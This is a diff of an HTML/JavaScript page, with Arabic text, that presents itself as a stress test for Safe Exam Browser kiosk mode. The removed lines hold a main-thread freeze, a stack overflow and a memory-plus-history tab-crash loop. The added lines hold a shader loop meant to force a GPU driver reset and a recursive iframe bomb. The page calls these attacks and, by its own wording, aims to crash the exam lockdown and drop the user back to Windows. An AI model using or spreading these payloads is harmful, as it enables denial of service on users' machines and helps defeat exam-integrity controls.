@@ -3,19 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SEB Kiosk Integrity & Crash Test</title>
+  <title>SEB Nuclear Stress Test</title>
   <style>
     :root {
-      --bg: #050811;
+      --bg: #030712;
       --card: #0f172a;
-      --danger: #ef4444;
-      --warning: #f59e0b;
+      --danger: #dc2626;
       --text: #f8fafc;
       --border: #1e293b;
     }
     body {
       margin: 0;
-      padding: 24px;
+      padding: 20px;
       font-family: system-ui, -apple-system, sans-serif;
       background: var(--bg);
       color: var(--text);
@@ -33,6 +32,17 @@
     h1 { margin: 0; font-size: 1.6rem; color: var(--danger); }
     p { margin: 6px 0 0 0; color: #94a3b8; font-size: 0.9rem; }
 
+    .warning-box {
+      background: #450a0a;
+      border: 1px solid var(--danger);
+      color: #fecaca;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
     .grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -48,6 +58,7 @@
     .card h3 { margin: 0 0 10px 0; font-size: 1.1rem; }
 
     button {
+      background: var(--danger);
       color: #ffffff;
       border: none;
       padding: 12px 18px;
@@ -58,36 +69,18 @@
       width: 100%;
       margin-top: 10px;
     }
-    .btn-freeze { background: var(--warning); color: #000; }
-    .btn-crash { background: var(--danger); }
-    .btn-loop { background: #8b5cf6; }
 
-    .counter-box {
-      background: #020617;
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      padding: 16px;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    #counter-display {
-      font-size: 2.2rem;
-      font-weight: bold;
-      color: #38bdf8;
-      font-family: monospace;
-    }
-    .log-box {
-      background: #020617;
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      padding: 12px;
+    canvas {
+      width: 100%;
       height: 150px;
-      overflow-y: auto;
-      font-family: monospace;
-      font-size: 0.85rem;
-      color: #ef4444;
-      direction: ltr;
-      text-align: left;
+      background: #000;
+      border-radius: 6px;
+      display: block;
+      margin-top: 10px;
+    }
+
+    #iframe-sink {
+      display: none;
     }
   </style>
 </head>
@@ -95,99 +88,119 @@
 
 <div class="container">
   <header>
-    <h1>SEB Kiosk Integrity & Boundary Test</h1>
-    <p>اختبار سلوك الحاوية الأمنية: هل سينهار SEB ويعيدك للويندوز العادي، أم سيتعامل مع التجميد والإسقاط؟</p>
+    <h1>SEB Deep Subsystem Stress Suite</h1>
+    <p>اختبار انهيار تعريف كرت الشاشة واستنزاف مقابض النظام (Handles & TDR Attacks).</p>
   </header>
 
-  <div class="counter-box">
-    <div>عداد الحركة الحية (إذا توقف هذا الرقم، فالواجهة الرئيسية متجمدة تماماً):</div>
-    <div id="counter-display">0</div>
+  <div class="warning-box">
+    تنبيه: هذه الاختبارات تتجاوز قيود المتصفح وتضغط على نظام التشغيل مباشرة. قد تومض الشاشة باللون الأسود للحظات نتيجة إعادة تشغيل تعريف كرت الشاشة (Display Driver Crash).
   </div>
 
   <div class="grid">
-    <!-- Test 1: Event Loop Lock -->
+    <!-- Test 1: Shader Raymarching / GPU TDR -->
     <div class="card">
-      <h3>1. تجميد الواجهة المباشر (Main Thread Lock)</h3>
-      <p>يقوم بقفل الـ Event Loop بالكامل لمدة 20 ثانية. اختبر هل شريط SEB وزر الخروج يستجيبان أثناء التجميد؟</p>
-      <button class="btn-freeze" onclick="lockMainThread(20)">تجميد لمدة 20 ثانية</button>
+      <h3>1. هجوم كرت الشاشة (GPU Driver TDR)</h3>
+      <p>ينفذ ملايين الحسابات الشعاعية التكرارية (Fractal Raymarching) في الإطار الواحد لإجبار الويندوز على إسقاط تعريف العرض.</p>
+      <canvas id="glcanvas"></canvas>
+      <button onclick="triggerGpuTdr()">بدء هجوم الـ GPU TDR</button>
     </div>
 
-    <!-- Test 2: Call Stack Exhaustion -->
+    <!-- Test 2: Recursive iFrame Bomb -->
     <div class="card">
-      <h3>2. كسر الـ Call Stack (Stack Overflow)</h3>
-      <p>استدعاء دالة متداخلة بلا نهاية لإجبار محرك المتصفح على مواجهة Maximum Call Stack Exceeded.</p>
-      <button class="btn-loop" onclick="triggerStackOverflow()">إحداث Stack Overflow</button>
-    </div>
-
-    <!-- Test 3: Tab Memory Exploit -->
-    <div class="card" style="grid-column: span 2;">
-      <h3>3. إسقاط المعالجة بالكامل (Hard Renderer Crash)</h3>
-      <p>محاولة خنق التبويب بملايين إدخالات التاريخ والمصفوفات المباشرة لدفع نظام Chromium لإسقاط التبويب (Tab Crash).</p>
-      <button class="btn-crash" onclick="forceTabCrash()">بدء هجوم الإسقاط الفوري (Crash Attempt)</button>
+      <h3>2. انفجار العقد والنوافذ (iFrame Bomb)</h3>
+      <p>يولد مئات إطارات الـ iFrame المتداخلة في أجزاء من الثانية لاستنزاف موارد شاشات العرض المخصصة لنظام Windows.</p>
+      <button style="background: #9333ea;" onclick="triggerIframeBomb()">تفجير الـ DOM & iFrames</button>
     </div>
   </div>
 
-  <div class="card">
-    <h3>سجل الأحداث</h3>
-    <div id="logs" class="log-box"></div>
-  </div>
+  <div id="iframe-sink"></div>
 </div>
 
 <script>
-  function log(msg) {
-    const box = document.getElementById('logs');
-    const time = new Date().toLocaleTimeString();
-    box.innerHTML += `[${time}] ${msg}<br>`;
-    box.scrollTop = box.scrollHeight;
-  }
+  // --- 1. GPU TDR ATTACK (Fractal Raymarcher) ---
+  const canvas = document.getElementById('glcanvas');
+  const gl = canvas.getContext('webgl');
 
-  // عداد حي لاختبار تجمد الواجهة
-  let count = 0;
-  setInterval(() => {
-    count++;
-    document.getElementById('counter-display').innerText = count;
-  }, 100);
+  function triggerGpuTdr() {
+    if (!gl) return;
 
-  // 1. تجميد خيط الواجهة لـ X ثانية
-  function lockMainThread(seconds) {
-    log(`تجميد الخيط الرئيسي لمدة ${seconds} ثانية...`);
-    setTimeout(() => {
-      const start = Date.now();
-      // حلقة تكرار متزامنة تمنع أي حدث آخر في المتصفح
-      while (Date.now() - start < seconds * 1000) {
-        Math.sqrt(Math.random());
+    const vs = `
+      attribute vec2 pos;
+      void main() { gl_Position = vec4(pos, 0.0, 1.0); }
+    `;
+
+    // شيدر شديد التعقيد الحسابي يجبر الـ GPU على التعليق في الإطار الواحد
+    const fs = `
+      precision highp float;
+      uniform vec2 res;
+      void main() {
+        vec2 uv = (gl_FragCoord.xy - 0.5 * res) / res.y;
+        vec3 col = vec3(0.0);
+        for(int i = 0; i < 2000; i++) {
+          uv = abs(uv) / dot(uv, uv) - vec2(0.5, 0.5);
+          col += sin(vec3(uv.x, uv.y, float(i) * 0.01));
+        }
+        gl_FragColor = vec4(col, 1.0);
       }
-      log('انتهت فترة التجميد واستعادت الواجهة نشاطها.');
-    }, 100);
-  }
+    `;
 
-  // 2. كسر الـ Call Stack
-  function triggerStackOverflow() {
-    log('محاولة كسر الـ Call Stack...');
-    try {
-      function recurse() {
-        recurse();
-      }
-      recurse();
-    } catch (e) {
-      log(`التقط المتصفح الاستثناء بأمان ومنع الانهيار: ${e.message}`);
+    const createShader = (type, src) => {
+      const s = gl.createShader(type);
+      gl.shaderSource(s, src);
+      gl.compileShader(s);
+      return s;
+    };
+
+    const prog = gl.createProgram();
+    gl.attachShader(prog, createShader(gl.VERTEX_SHADER, vs));
+    gl.attachShader(prog, createShader(gl.FRAGMENT_SHADER, fs));
+    gl.linkProgram(prog);
+    gl.useProgram(prog);
+
+    const buf = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
+
+    const pos = gl.getAttribLocation(prog, "pos");
+    gl.enableVertexAttribArray(pos);
+    gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
+
+    const resLoc = gl.getUniformLocation(prog, "res");
+    gl.uniform2f(resLoc, canvas.width, canvas.height);
+
+    // حلقة رسم قسرية متزامنة
+    for (let j = 0; j < 50; j++) {
+      gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+      gl.finish(); // إجبار المعالج الرسومي على الانتظار حتى اكتمال الحسابات
     }
   }
 
-  // 3. هجوم إسقاط التبويب لإجباره على الخروج
-  function forceTabCrash() {
-    log('جارٍ تنفيذ هجوم إسقاط التبويب (PushState + Array Choke)...');
-    setTimeout(() => {
-      let arr = [];
-      while (true) {
-        // حجز عنيف جداً ومتزامن على الـ Main Thread مع تعديل الـ History
-        arr.push(new Array(5000000).fill('CRASH'));
-        history.pushState(0, 0, Math.random().toString());
-      }
-    }, 100);
-  }
+  // --- 2. RECURSIVE IFRAME FORK BOMB ---
+  function triggerIframeBomb() {
+    const sink = document.getElementById('iframe-sink');
+    sink.style.display = 'block';
 
-  log('جاهز لاختبار كسر بيئة الـ Kiosk.');
+    const generateFrames = (depth) => {
+      if (depth <= 0) return;
+      for (let i = 0; i < 8; i++) {
+        const frame = document.createElement('iframe');
+        frame.srcdoc = `
+          <script>
+            let arr = [];
+            for(let j = 0; j < 20; j++) {
+              let f = document.createElement('iframe');
+              f.srcdoc = '<b>Node</b>';
+              document.body.appendChild(f);
+            }
+          <\/script>
+        `;
+        sink.appendChild(frame);
+      }
+      setTimeout(() => generateFrames(depth - 1), 10);
+    };
+
+    generateFrames(6); // يولد آلاف العقد المتشابكة لحظياً
+  }
 </script>
 
 </body>
